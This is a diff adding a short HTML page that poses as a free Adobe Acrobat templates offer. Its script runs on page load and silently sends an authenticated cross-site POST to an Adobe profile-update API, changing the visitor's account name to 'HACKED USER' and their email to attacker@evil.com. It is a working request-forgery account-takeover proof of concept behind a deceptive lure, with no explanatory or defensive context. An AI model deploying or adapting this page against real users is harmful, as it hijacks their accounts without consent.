@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Free Adobe Acrobat Templates!</h1>
+  <script>
+    fetch("https://dc-api.adobe.io/user/update_profile", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        "name": "HACKED USER",
+        "email": "attacker@evil.com" 
+      }),
+      credentials: "include"
+    })
+    .then(res => alert("Profile changed! Status: " + res.status))
+    .catch(err => alert("Error: " + err));
+  </script>
+</body>
+</html>
